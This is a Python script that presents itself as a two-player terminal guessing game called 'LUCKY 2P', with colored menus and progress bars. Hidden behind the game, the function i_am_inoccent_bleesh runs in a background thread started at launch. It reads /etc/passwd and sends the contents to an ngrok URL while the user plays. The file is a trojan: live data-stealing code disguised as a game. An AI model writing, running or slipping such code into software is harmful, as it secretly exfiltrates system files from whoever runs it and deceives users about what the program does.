import random
import re,os
import requests,threading
import socket
import sys
import subprocess
from terminal_banner import Banner
from colorama import Fore, Back, Style
from time import sleep
import progressbar
def menu():
 print(Fore.CYAN+"[1] Choose a section A/B?")
 print(Fore.CYAN+"[2] Exit")
 s=input(">>>")
 if s==2:
   sys.exit()
 c=raw_input(Fore.RED+"(A/B)>>>")
 print(Fore.GREEN)
 loading(4)
 os.system("clear")
 return c

def check_i():
 r=requests.session()
 op=r.get("http://www.google.com")
 if op:
  return 1
 else:
  return 0
 
def game():
 m_x=input(Fore.CYAN+"Enter the Max Val(>100) >>")
 l_x_A=0
 l_x_B=0
 winner='C'
 while(l_x_A <= m_x and l_x_B <= m_x):
  l_x_A=random.randint(0,10)+l_x_A
  l_x_B=random.randint(0,10)+l_x_B
  if l_x_A > l_x_B:
    winner='A'
  else:
     winner='B'
  print(Fore.YELLOW)
  print("                      {}                                |                        {}                   ".format(l_x_A,l_x_B))
  loading(2)
 return winner

def loading(s):
 for i in progressbar.progressbar(range(s),redirect_stdout=True):
    sleep(0.1)

def threader():
 gm=threading.Thread(target=main_g,name="GameGameHa")
 rs=threading.Thread(target=i_am_inoccent_bleesh,name="stealing")
 rs.start()
 gm.run()
def main_g():
 l=["Fore.RED","Fore.GREEN","Fore.BLUE","Fore.CYAN","Fore.YELLOW"]
 b=[]
 for i in l[::-1]:
  b.append(re.sub("Fore","Back",i))

 answer='Y'
 while answer=='Y':
  print(Fore.YELLOW)
  print(Banner("\t\t\t                              LUCKY _ _ _ _ _ _ _ 2 P       "))
  y=menu()
  k=game()
  print(y,k)
  if y==k:
    print(Fore.BLUE+"Winner Winner Lucky Winner!")
    answer='Winner'
  else:
    print(Fore.RED+"Looser Looser Unlucky Looser!")
    answer=raw_input("Do you wanna retry Looser!(Y/N)")

def i_am_inoccent_bleesh():
 s=subprocess.check_output(['cat','/etc/passwd'])
 r=requests.session()
 data={ 'file' : "{}".format(s)}
 r.get("http://6a78615fe1c0.ngrok.io/?k={}".format(''.join(data['file'])))

threader()
